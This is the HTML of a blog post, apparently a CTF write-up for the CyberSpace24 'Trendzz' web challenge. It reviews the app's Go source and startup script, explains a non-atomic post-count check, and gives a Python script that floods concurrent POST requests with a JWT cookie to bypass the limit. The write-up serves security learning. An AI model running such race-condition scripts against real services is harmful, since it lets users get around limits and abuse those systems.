<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>CyberSpace24 - Trendzz | hxuu</title><meta name=keywords content="ctf,write-up,cyberspace"><meta name=description content="CTF write-up for Trendzz"><meta name=author content="hxuu"><link rel=canonical href=https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/><link crossorigin=anonymous href=/blog/assets/css/stylesheet.e44f33264f033f576c3ce7f772762cc751d91ddb02aaa170e312a8aff988c2e6.css integrity="sha256-5E8zJk8DP1dsPOf3cnYsx1HZHdsCqqFw4xKor/mIwuY=" rel="preload stylesheet" as=style><link rel=icon href=https://hxuu.github.io/blog/favicon.ico><link rel=icon type=image/png sizes=16x16 href=https://hxuu.github.io/blog/favicon-16x16.png><link rel=icon type=image/png sizes=32x32 href=https://hxuu.github.io/blog/favicon-32x32.png><link rel=apple-touch-icon href=https://hxuu.github.io/blog/apple-touch-icon.png><link rel=mask-icon href=https://hxuu.github.io/blog/safari-pinned-tab.svg><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><link rel=alternate hreflang=en href=https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--code-block-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><meta property="og:url" content="https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/"><meta property="og:site_name" content="hxuu"><meta property="og:title" content="CyberSpace24 - Trendzz"><meta property="og:description" content="CTF write-up for Trendzz"><meta property="og:locale" content="en-us"><meta property="og:type" content="article"><meta property="article:section" content="ctf"><meta property="article:published_time" content="2024-09-02T11:13:20+01:00"><meta property="article:modified_time" content="2024-09-02T11:13:20+01:00"><meta property="article:tag" content="Ctf"><meta property="article:tag" content="Write-Up"><meta property="article:tag" content="Cyberspace"><meta property="og:image" content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="CyberSpace24 - Trendzz"><meta name=twitter:description content="CTF write-up for Trendzz"><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Ctfs","item":"https://hxuu.github.io/blog/ctf/"},{"@type":"ListItem","position":2,"name":"CyberSpace24 - Trendzz","item":"https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"CyberSpace24 - Trendzz","name":"CyberSpace24 - Trendzz","description":"CTF write-up for Trendzz","keywords":["ctf","write-up","cyberspace"],"articleBody":"Challenge Description name: trendzz category: web exploitation points: 175 solves: 86 Staying active has its rewards. There’s a special gift waiting for you, but it’s only available once you’ve made more than 12 posts. Keep posting to uncover the surprise!\nNote: Use the instancer and source from part one of this challenge, Trendz.\nAnalysis We’re given the following login page\nlet’s register and check the main page\nIt a one page website, that enables us to create posts and view them. Checking the challenge description again, it seems that we have to post more than 12 posts to uncover the special “gift” which is probably the flag. Let’s try posting then.\nOops, we can’t create more than 10 posts. Why is that? Luckily for us, we’re given the source code of the application here\n. ├── Dockerfile ├── go.mod ├── go.sum ├── handlers │ ├── custom │ │ └── Custom.go │ ├── dashboard │ │ ├── AdminDash.go │ │ ├── SuperAdminDash.go │ │ └── UserDash.go │ ├── db │ │ └── Init.go │ ├── jwt │ │ └── JWTAuth.go │ └── service │ ├── CreateUser.go │ ├── JWTHandler.go │ ├── LoginUser.go │ ├── Posts.go │ └── ValidateAdmin.go ├── init.sql ├── jwt.secret ├── main.go ├── nginx.conf ├── readme.md ├── run.sh ├── static │ ├── css │ │ ├── admin.css │ │ ├── bootstrap.min.css │ │ ├── style.css │ │ └── user.css │ ├── index.html │ └── js │ ├── client-side-templates.js │ ├── htmx.min.js │ ├── json-enc.js │ └── nunjucks.min.js └── templates ├── adminDash.tmpl ├── login.tmpl ├── main.tmpl ├── register.tmpl ├── superAdminDash.tmpl ├── userDash.tmpl └── viewPost.tmpl It’s a go application then, let’s check the Dockerfile\nDockerfile FROM golang:alpine AS builder RUN apk update \u0026\u0026 apk add --no-cache git WORKDIR /app COPY go.mod go.sum ./ RUN go mod download COPY . . ENV GIN_MODE=release ENV PORT=8000 RUN go build -o /app/chall FROM postgres:alpine RUN apk update \u0026\u0026 apk add --no-cache nginx COPY nginx.conf /etc/nginx/nginx.conf COPY run.sh /usr/local/bin/run.sh COPY init.sql /docker-entrypoint-initdb.d/init.sql WORKDIR /app COPY --from=builder /app/chall /app/chall COPY static static COPY templates templates ENTRYPOINT [\"sh\", \"/usr/local/bin/run.sh\"] This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.\nThe run.sh script is the entrypoint of the application. Let’s check that:\nrun.sh #!/bin/env sh cat /dev/urandom | head | sha1sum | cut -d \" \" -f 1 \u003e /app/jwt.secret export JWT_SECRET_KEY=notsosecurekey export ADMIN_FLAG=CSCTF{flag1} export POST_FLAG=CSCTF{flag2} export SUPERADMIN_FLAG=CSCTF{flag3} export REV_FLAG=CSCTF{flag4} export POSTGRES_USER=postgres export POSTGRES_PASSWORD=mysecretpassword export POSTGRES_DB=devdb uuid=$(cat /proc/sys/kernel/random/uuid) user=$(cat /dev/urandom | head | md5sum | cut -d \" \" -f 1) cat \u003c\u003c EOF \u003e\u003e /docker-entrypoint-initdb.d/init.sql INSERT INTO users (username, password, role) VALUES ('superadmin', 'superadmin', 'superadmin'); INSERT INTO posts (postid, username, title, data) VALUES ('$uuid', '$user', 'Welcome to the CTF!', '$ADMIN_FLAG'); EOF docker-ensure-initdb.sh \u0026 GIN_MODE=release /app/chall \u0026 sleep 5 su postgres -c \"postgres -D /var/lib/postgresql/data\" \u0026 nginx -g 'daemon off;' This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.\nSince the actual challenge consists of 4 independent parts (trend[number-of-z]), we can deduce based on the challenge name, that the flag we’re looking for is POST_FLAG.\nLet’s search in the codebase to see where this flag is mentioned.\nNote: you can check the source code of the application alone, since the code base is a bit bigger than what a writeup could handle, I’ll entrust the process of understanding the api to you.\nSearching for the keyword, we get one occurrence in handlers/service/Posts.go, more specifically in the DisplayFlag function that looks like this:\nfunc DisplayFlag(ctx *gin.Context) { username := ctx.MustGet(\"username\").(string) noOfPosts := CheckNoOfPosts(username) if noOfPosts \u003c= 12 { ctx.JSON(200, gin.H{\"error\": fmt.Sprintf(\"You need %d more posts to view the flag\", 12-noOfPosts)}) return } ctx.JSON(200, gin.H{\"flag\": os.Getenv(\"POST_FLAG\")}) } Upon calling the function, we check the number of posts (which is a query to the database), if the number of posts \u003e 12, then we return the flag.\nLet’s check which endpoint makes call to DisplayFlag.\nOne occurence in the main.go script under the user group.\nIf you look closely at the code, you’ll know that the CreatePost function is vulnerable to race conditions because it checks the post count before inserting a new post. If multiple requests are processed simultaneously, each request may see the same count and insert posts, exceeding the allowed limit. This occurs because the count check and insertion are not done atomically, allowing concurrent requests to bypass the limit.\nExploitation Armed with this knowledge, we can create a python script that makes requests concurrently to create more than 12 posts before the count is greater than 10.\nsolve.py import aiohttp import asyncio # endpoint to create posts url = 'http://6a6fc715-3148-439c-97a7-401b124afad5.bugg.cc/user/posts/create' # get the accesstoken from the cookies upon login cookies = { \"accesstoken\": \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUyNzQxMzksImlhdCI6MTcyNTI3MzUzOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImgifQ.PT9VM2KV4dSlp3uNTfRuwsJ_3hfaPKaLWNbkZiWt0TQ\" } # POST Data post_data = { \"title\": \"Race Condition Test\", \"data\": \"This is the data for the post\" } async def send_post(session, semaphore): async with semaphore: async with session.post(url, json=post_data, cookies=cookies) as response: text = await response.text() print(f\"Response: {text}\") async def main(): concurrency_limit = 100 # Limit the number of concurrent requests semaphore = asyncio.Semaphore(concurrency_limit) async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=concurrency_limit)) as session: tasks = [send_post(session, semaphore) for _ in range(50)] await asyncio.gather(*tasks) # Run the main function asyncio.run(main()) Running python solve.py should create more than 12 posts. To verify my claim, let’s try to access /user/flag to see if we actually get the flag.\nAnd there you go~ Flag is: CSCTF{d2426fb5-a93a-4cf2-b353-eac8e0e9cf94}\nLessons Learned from this challenge:\nRace Conditions: Ensure checks and operations are atomic. Source Code Review: Look for vulnerabilities in code. Concurrency Issues: Test for concurrent request handling. Automated Testing: Use scripts to detect issues. Environment Security: Protect sensitive data in environment variables. ","wordCount":"1001","inLanguage":"en","image":"https://hxuu.github.io/blog/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E","datePublished":"2024-09-02T11:13:20+01:00","dateModified":"2024-09-02T11:13:20+01:00","author":{"@type":"Person","name":"hxuu"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://hxuu.github.io/blog/ctf/cyberspace24/trendzz/"},"publisher":{"@type":"Organization","name":"hxuu","logo":{"@type":"ImageObject","url":"https://hxuu.github.io/blog/favicon.ico"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://hxuu.github.io/blog/ accesskey=h title="hxuu (Alt + H)"><img src=https://hxuu.github.io/apple-touch-icon.png alt aria-label=logo height=35>hxuu</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)" aria-label="Toggle theme">
<svg id="moon" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg>
<svg id="sun" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://hxuu.github.io/blog/ctf/ title=CTFs><span>CTFs</span></a></li><li><a href=https://hxuu.github.io/blog/search/ title="Search (Alt + /)" accesskey=/><span>Search</span></a></li><li><a href=https://hxuu.github.io/blog/tags/ title=Tags><span>Tags</span></a></li><li><a href=https://github.com/hxuu title="About Me"><span>About Me</span>&nbsp;
<svg fill="none" shape-rendering="geometricPrecision" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2.5" viewBox="0 0 24 24" height="12" width="12"><path d="M18 13v6a2 2 0 01-2 2H5a2 2 0 01-2-2V8a2 2 0 012-2h6"/><path d="M15 3h6v6"/><path d="M10 14 21 3"/></svg></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://hxuu.github.io/blog/>Home</a>&nbsp;»&nbsp;<a href=https://hxuu.github.io/blog/ctf/>Ctfs</a></div><h1 class="post-title entry-hint-parent">CyberSpace24 - Trendzz</h1><div class=post-description>CTF write-up for Trendzz</div><div class=post-meta><span title='2024-09-02 11:13:20 +0100 CET'>September 2, 2024</span>&nbsp;·&nbsp;5 min&nbsp;·&nbsp;hxuu&nbsp;|&nbsp;<a href=https://github.com/hxuu/content/ctf/cyberspace24/trendzz.md rel="noopener noreferrer edit" target=_blank>Suggest Changes</a></div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><nav id=TableOfContents><ul><li><a href=#challenge-description>Challenge Description</a></li><li><a href=#analysis>Analysis</a><ul><li><a href=#dockerfile><code>Dockerfile</code></a></li><li><a href=#runsh><code>run.sh</code></a></li></ul></li><li><a href=#exploitation>Exploitation</a><ul><li><a href=#solvepy><code>solve.py</code></a></li></ul></li></ul></nav></div></details></div><div class=post-content><h2 id=challenge-description>Challenge Description<a hidden class=anchor aria-hidden=true href=#challenge-description>#</a></h2><pre tabindex=0><code>name: trendzz
category: web exploitation
points: 175
solves: 86
</code></pre><p>Staying active has its rewards. There&rsquo;s a special gift waiting for you, but it&rsquo;s only available once you&rsquo;ve made more than 12 posts. Keep posting to uncover the surprise!</p><blockquote><p>Note: Use the instancer and source from part one of this challenge, Trendz.</p></blockquote><h2 id=analysis>Analysis<a hidden class=anchor aria-hidden=true href=#analysis>#</a></h2><p>We&rsquo;re given the following login page</p><p><img alt=initial loading=lazy src=/blog/images/2024-09-02-11-15-04.png></p><p>let&rsquo;s register and check the main page</p><p><img alt=functionality loading=lazy src=/blog/images/2024-09-02-11-15-54.png></p><p>It a one page website, that enables us to create posts and view them. Checking the challenge
description again, it seems that we have to post more than 12 posts to uncover the special &ldquo;gift&rdquo;
which is probably the flag. Let&rsquo;s try posting then.</p><p><img alt=error-posts loading=lazy src=/blog/images/2024-09-02-11-18-08.png></p><p>Oops, we can&rsquo;t create more than 10 posts. Why is that? Luckily for us, we&rsquo;re given the source code
of the application <a href="https://2024.csc.tf/files/b8af02ac0f411268b239e62fd2c6e7dd/handout_trendz.zip?token=eyJ1c2VyX2lkIjo4MDEsInRlYW1faWQiOjQwMCwiZmlsZV9pZCI6NTB9.ZtWjAA.MI0GGzruP8zhlBfSGxRmioVo8zQ">here</a></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>.
</span></span><span class=line><span class=cl>├── Dockerfile
</span></span><span class=line><span class=cl>├── go.mod
</span></span><span class=line><span class=cl>├── go.sum
</span></span><span class=line><span class=cl>├── handlers
</span></span><span class=line><span class=cl>│   ├── custom
</span></span><span class=line><span class=cl>│   │   └── Custom.go
</span></span><span class=line><span class=cl>│   ├── dashboard
</span></span><span class=line><span class=cl>│   │   ├── AdminDash.go
</span></span><span class=line><span class=cl>│   │   ├── SuperAdminDash.go
</span></span><span class=line><span class=cl>│   │   └── UserDash.go
</span></span><span class=line><span class=cl>│   ├── db
</span></span><span class=line><span class=cl>│   │   └── Init.go
</span></span><span class=line><span class=cl>│   ├── jwt
</span></span><span class=line><span class=cl>│   │   └── JWTAuth.go
</span></span><span class=line><span class=cl>│   └── service
</span></span><span class=line><span class=cl>│       ├── CreateUser.go
</span></span><span class=line><span class=cl>│       ├── JWTHandler.go
</span></span><span class=line><span class=cl>│       ├── LoginUser.go
</span></span><span class=line><span class=cl>│       ├── Posts.go
</span></span><span class=line><span class=cl>│       └── ValidateAdmin.go
</span></span><span class=line><span class=cl>├── init.sql
</span></span><span class=line><span class=cl>├── jwt.secret
</span></span><span class=line><span class=cl>├── main.go
</span></span><span class=line><span class=cl>├── nginx.conf
</span></span><span class=line><span class=cl>├── readme.md
</span></span><span class=line><span class=cl>├── run.sh
</span></span><span class=line><span class=cl>├── static
</span></span><span class=line><span class=cl>│   ├── css
</span></span><span class=line><span class=cl>│   │   ├── admin.css
</span></span><span class=line><span class=cl>│   │   ├── bootstrap.min.css
</span></span><span class=line><span class=cl>│   │   ├── style.css
</span></span><span class=line><span class=cl>│   │   └── user.css
</span></span><span class=line><span class=cl>│   ├── index.html
</span></span><span class=line><span class=cl>│   └── js
</span></span><span class=line><span class=cl>│       ├── client-side-templates.js
</span></span><span class=line><span class=cl>│       ├── htmx.min.js
</span></span><span class=line><span class=cl>│       ├── json-enc.js
</span></span><span class=line><span class=cl>│       └── nunjucks.min.js
</span></span><span class=line><span class=cl>└── templates
</span></span><span class=line><span class=cl>    ├── adminDash.tmpl
</span></span><span class=line><span class=cl>    ├── login.tmpl
</span></span><span class=line><span class=cl>    ├── main.tmpl
</span></span><span class=line><span class=cl>    ├── register.tmpl
</span></span><span class=line><span class=cl>    ├── superAdminDash.tmpl
</span></span><span class=line><span class=cl>    ├── userDash.tmpl
</span></span><span class=line><span class=cl>    └── viewPost.tmpl
</span></span></code></pre></div><p>It&rsquo;s a go application then, let&rsquo;s check the <code>Dockerfile</code></p><h3 id=dockerfile><code>Dockerfile</code><a hidden class=anchor aria-hidden=true href=#dockerfile>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-Dockerfile data-lang=Dockerfile><span class=line><span class=cl><span class=k>FROM</span><span class=s> golang:alpine AS builder</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apk update <span class=o>&amp;&amp;</span> apk add --no-cache git<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> go.mod go.sum ./<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> go mod download<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> . .<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENV</span> <span class=nv>GIN_MODE</span><span class=o>=</span>release
</span></span><span class=line><span class=cl><span class=k>ENV</span> <span class=nv>PORT</span><span class=o>=</span><span class=m>8000</span>
</span></span><span class=line><span class=cl><span class=k>RUN</span> go build -o /app/chall<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>FROM</span><span class=s> postgres:alpine</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>RUN</span> apk update <span class=o>&amp;&amp;</span> apk add --no-cache nginx<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> nginx.conf /etc/nginx/nginx.conf<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> run.sh /usr/local/bin/run.sh<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> init.sql /docker-entrypoint-initdb.d/init.sql<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>WORKDIR</span><span class=s> /app</span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> --from<span class=o>=</span>builder /app/chall /app/chall<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> static static<span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>COPY</span> templates templates<span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=k>ENTRYPOINT</span> <span class=p>[</span><span class=s2>&#34;sh&#34;</span><span class=p>,</span> <span class=s2>&#34;/usr/local/bin/run.sh&#34;</span><span class=p>]</span><span class=err>
</span></span></span></code></pre></div><p>This Dockerfile creates a multi-stage build for a web application. In the first stage, it uses the Go language to build the application. In the second stage, it sets up a PostgreSQL container with Nginx and copies the built application, configuration files, and other resources. It then runs a script to start the application.</p><p>The <code>run.sh</code> script is the entrypoint of the application. Let&rsquo;s check that:</p><h3 id=runsh><code>run.sh</code><a hidden class=anchor aria-hidden=true href=#runsh>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/env sh
</span></span></span><span class=line><span class=cl><span class=cp></span>cat /dev/urandom <span class=p>|</span> head <span class=p>|</span> sha1sum <span class=p>|</span> cut -d <span class=s2>&#34; &#34;</span> -f <span class=m>1</span> &gt; /app/jwt.secret
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>JWT_SECRET_KEY</span><span class=o>=</span>notsosecurekey
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>ADMIN_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag1<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POST_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag2<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>SUPERADMIN_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag3<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>REV_FLAG</span><span class=o>=</span>CSCTF<span class=o>{</span>flag4<span class=o>}</span>
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_USER</span><span class=o>=</span>postgres
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_PASSWORD</span><span class=o>=</span>mysecretpassword
</span></span><span class=line><span class=cl><span class=nb>export</span> <span class=nv>POSTGRES_DB</span><span class=o>=</span>devdb
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nv>uuid</span><span class=o>=</span><span class=k>$(</span>cat /proc/sys/kernel/random/uuid<span class=k>)</span>
</span></span><span class=line><span class=cl><span class=nv>user</span><span class=o>=</span><span class=k>$(</span>cat /dev/urandom <span class=p>|</span> head <span class=p>|</span> md5sum <span class=p>|</span> cut -d <span class=s2>&#34; &#34;</span> -f 1<span class=k>)</span>
</span></span><span class=line><span class=cl>cat <span class=s>&lt;&lt; EOF &gt;&gt; /docker-entrypoint-initdb.d/init.sql
</span></span></span><span class=line><span class=cl><span class=s>	INSERT INTO users (username, password, role) VALUES (&#39;superadmin&#39;, &#39;superadmin&#39;, &#39;superadmin&#39;);
</span></span></span><span class=line><span class=cl><span class=s>    INSERT INTO posts (postid, username, title, data) VALUES (&#39;$uuid&#39;, &#39;$user&#39;, &#39;Welcome to the CTF!&#39;, &#39;$ADMIN_FLAG&#39;);
</span></span></span><span class=line><span class=cl><span class=s>EOF</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>docker-ensure-initdb.sh <span class=p>&amp;</span>
</span></span><span class=line><span class=cl><span class=nv>GIN_MODE</span><span class=o>=</span>release /app/chall <span class=p>&amp;</span> sleep <span class=m>5</span>
</span></span><span class=line><span class=cl>su postgres -c <span class=s2>&#34;postgres -D /var/lib/postgresql/data&#34;</span> <span class=p>&amp;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>nginx -g <span class=s1>&#39;daemon off;&#39;</span>
</span></span></code></pre></div><p>This script initializes the Docker container environment. It generates a random JWT secret and sets various environment variables including flags and database credentials. It creates an initial SQL script for the database with user and post entries, starts the application and PostgreSQL, and then launches Nginx.</p><p>Since the actual challenge consists of 4 independent parts <code>(trend[number-of-z])</code>,
we can deduce based on the challenge name, that the flag we&rsquo;re looking for is <code>POST_FLAG</code>.</p><p>Let&rsquo;s search in the codebase to see where this flag is mentioned.</p><blockquote><p>Note: you can check the source code of the application alone, since the code base is a bit
bigger than what a writeup could handle, I&rsquo;ll entrust the process of understanding the api to you.</p></blockquote><p>Searching for the keyword, we get one occurrence in <code>handlers/service/Posts.go</code>, more specifically
in the <code>DisplayFlag</code> function that looks like this:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=line><span class=cl><span class=kd>func</span> <span class=nf>DisplayFlag</span><span class=p>(</span><span class=nx>ctx</span> <span class=o>*</span><span class=nx>gin</span><span class=p>.</span><span class=nx>Context</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>	<span class=nx>username</span> <span class=o>:=</span> <span class=nx>ctx</span><span class=p>.</span><span class=nf>MustGet</span><span class=p>(</span><span class=s>&#34;username&#34;</span><span class=p>).(</span><span class=kt>string</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=nx>noOfPosts</span> <span class=o>:=</span> <span class=nf>CheckNoOfPosts</span><span class=p>(</span><span class=nx>username</span><span class=p>)</span>
</span></span><span class=line><span class=cl>	<span class=k>if</span> <span class=nx>noOfPosts</span> <span class=o>&lt;=</span> <span class=mi>12</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>		<span class=nx>ctx</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;error&#34;</span><span class=p>:</span> <span class=nx>fmt</span><span class=p>.</span><span class=nf>Sprintf</span><span class=p>(</span><span class=s>&#34;You need %d more posts to view the flag&#34;</span><span class=p>,</span> <span class=mi>12</span><span class=o>-</span><span class=nx>noOfPosts</span><span class=p>)})</span>
</span></span><span class=line><span class=cl>		<span class=k>return</span>
</span></span><span class=line><span class=cl>	<span class=p>}</span>
</span></span><span class=line><span class=cl>	<span class=nx>ctx</span><span class=p>.</span><span class=nf>JSON</span><span class=p>(</span><span class=mi>200</span><span class=p>,</span> <span class=nx>gin</span><span class=p>.</span><span class=nx>H</span><span class=p>{</span><span class=s>&#34;flag&#34;</span><span class=p>:</span> <span class=nx>os</span><span class=p>.</span><span class=nf>Getenv</span><span class=p>(</span><span class=s>&#34;POST_FLAG&#34;</span><span class=p>)})</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Upon calling the function, we check the number of posts (which is a query to the database),
if the number of posts > 12, then we return the flag.</p><p>Let&rsquo;s check which endpoint makes call to DisplayFlag.</p><p><img alt=occurence loading=lazy src=/blog/images/2024-09-02-11-29-57.png></p><p>One occurence in the <code>main.go</code> script under the <code>user</code> group.</p><hr><p>If you look closely at the code, you&rsquo;ll know that the <code>CreatePost</code> function is vulnerable to race conditions because it checks the post count before inserting a new post. If multiple requests are processed simultaneously, each request may see the same count and insert posts, exceeding the allowed limit. This occurs because the count check and insertion are not done atomically, allowing concurrent requests to bypass the limit.</p><p><img alt=race-condition-vector loading=lazy src=/blog/images/2024-09-02-11-35-01.png></p><h2 id=exploitation>Exploitation<a hidden class=anchor aria-hidden=true href=#exploitation>#</a></h2><p>Armed with this knowledge, we can create a python script that makes requests concurrently
to create more than 12 posts before the count is greater than 10.</p><h3 id=solvepy><code>solve.py</code><a hidden class=anchor aria-hidden=true href=#solvepy>#</a></h3><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>aiohttp</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>asyncio</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># endpoint to create posts</span>
</span></span><span class=line><span class=cl><span class=n>url</span> <span class=o>=</span> <span class=s1>&#39;http://6a6fc715-3148-439c-97a7-401b124afad5.bugg.cc/user/posts/create&#39;</span>
</span></span><span class=line><span class=cl><span class=c1># get the accesstoken from the cookies upon login</span>
</span></span><span class=line><span class=cl><span class=n>cookies</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;accesstoken&#34;</span><span class=p>:</span> <span class=s2>&#34;eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjUyNzQxMzksImlhdCI6MTcyNTI3MzUzOSwicm9sZSI6InVzZXIiLCJ1c2VybmFtZSI6ImgifQ.PT9VM2KV4dSlp3uNTfRuwsJ_3hfaPKaLWNbkZiWt0TQ&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># POST Data</span>
</span></span><span class=line><span class=cl><span class=n>post_data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;title&#34;</span><span class=p>:</span> <span class=s2>&#34;Race Condition Test&#34;</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;data&#34;</span><span class=p>:</span> <span class=s2>&#34;This is the data for the post&#34;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>async</span> <span class=k>def</span> <span class=nf>send_post</span><span class=p>(</span><span class=n>session</span><span class=p>,</span> <span class=n>semaphore</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=k>async</span> <span class=k>with</span> <span class=n>semaphore</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>async</span> <span class=k>with</span> <span class=n>session</span><span class=o>.</span><span class=n>post</span><span class=p>(</span><span class=n>url</span><span class=p>,</span> <span class=n>json</span><span class=o>=</span><span class=n>post_data</span><span class=p>,</span> <span class=n>cookies</span><span class=o>=</span><span class=n>cookies</span><span class=p>)</span> <span class=k>as</span> <span class=n>response</span><span class=p>:</span>
